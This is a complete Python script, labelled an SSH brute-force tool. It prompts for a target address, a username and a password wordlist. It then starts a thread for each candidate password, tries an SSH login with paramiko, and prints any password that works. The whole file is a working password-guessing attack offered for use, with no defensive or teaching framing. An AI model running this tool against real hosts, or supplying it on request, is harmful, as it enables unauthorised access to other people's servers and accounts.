#SSH Brute Force 2021, running on threads

# --- Libraries ---
import paramiko, sys, os, termcolor
import threading, time

stopFlag = 0

#ssh connection
def sshConnect(password):
    global stopFlag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        #Port 22 is regular port for SSH
        ssh.connect(host, port=22, username=username, password=password)
        stopFlag = 1
        print("\n")
        print("[!!] Found Password: " + str(termcolor.colored((password), 'green')) + " for account: " + str(termcolor.colored((username), 'green')))
        print("\n")
    except:
        print(termcolor.colored(("Incorrect Password: "), 'red') + str(password))
    ssh.close()


#User input
host = input("[+] Target address: ")
username = input("[+] SSH username: ")
inputFile = input("[+] Password file: ")
print("\n")

#is passwords file correct?
if os.path.exists(inputFile) == False:
    print("[!!] File/path does not exist.")
    sys.exit(1)

print("* * * Starting " + termcolor.colored(("Threaded SSH Bruteforce"), 'red') + " at host " + termcolor.colored((host), 'red') + " with username: " + termcolor.colored((username), 'red') + " * * *")

#Open file, comparison of passwords with SSH Client
with open(inputFile, 'r') as file:
    for line in file.readlines():
        if stopFlag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=sshConnect, args=(password,))
        t.start()
        time.sleep(0.5)
